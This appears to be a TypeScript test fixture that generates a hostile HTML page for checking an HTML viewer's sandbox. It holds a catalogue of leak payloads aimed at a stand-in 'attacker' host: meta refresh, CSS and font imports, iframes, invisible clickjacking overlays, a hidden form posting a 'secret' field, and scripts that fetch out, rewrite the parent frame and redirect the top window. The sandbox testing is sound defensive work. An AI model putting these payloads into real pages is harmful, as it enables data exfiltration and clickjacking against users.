/** A hostile static HTML page for the HTML view's sandbox (#317). Every way out a page without running code has, plus a
 *  script that would change the page's text and reach out if it ran. Each attempt targets the check's own listener with
 *  its own path, so a hit names the attempt. */
export function hostileStaticPage(attacker: string, scripts = true, refreshSeconds = 1) {
  const page = `<!doctype html><title>hostile</title>
<meta http-equiv="refresh" content="${refreshSeconds};url=${attacker}/meta-refresh">
<style>@import url("${attacker}/css-import");@font-face{font-family:x;src:url("${attacker}/font")}body{font-family:x;background:url("${attacker}/css-bg")}</style>
<link rel="stylesheet" href="${attacker}/stylesheet"><link rel="prefetch" href="${attacker}/prefetch"><link rel="icon" href="${attacker}/icon">
<img src="${attacker}/img"><picture><source srcset="${attacker}/srcset"><img alt=""></picture>
<video src="${attacker}/video" autoplay muted></video><object data="${attacker}/object"></object><embed src="${attacker}/embed">
<iframe src="${attacker}/nested-iframe"></iframe><iframe srcdoc="<img src='${attacker}/nested-img'>"></iframe>
<a href="${attacker}/link-blank" target="_blank" style="position:fixed;left:0;top:0;width:33%;height:100%;z-index:9"></a>
<form id="f" method="post" action="${attacker}/form-post"><input name="secret" value="x"><button id="send" style="position:fixed;left:33%;top:0;width:34%;height:100%;opacity:0;z-index:9">send</button></form>
<a href="${attacker}/link-top" target="_top" style="position:fixed;right:0;top:0;width:33%;height:100%;z-index:9"></a>
<p id="out">STATIC TEXT</p>
<script src="${attacker}/script-src"></script>
<script>
document.getElementById('out').textContent = 'SCRIPT RAN'
fetch('${attacker}/script-fetch').catch(() => {})
new Image().src = '${attacker}/script-img'
try { parent.document.getElementById('marker').textContent = 'PWNED' } catch {}
try { top.location = '${attacker}/script-top' } catch {}
</script>`
  // Without its scripts (for a control that must show the form post, link click and meta refresh leak on their own).
  return scripts ? page : page.replace(/<script[\s\S]*$/, '')
}
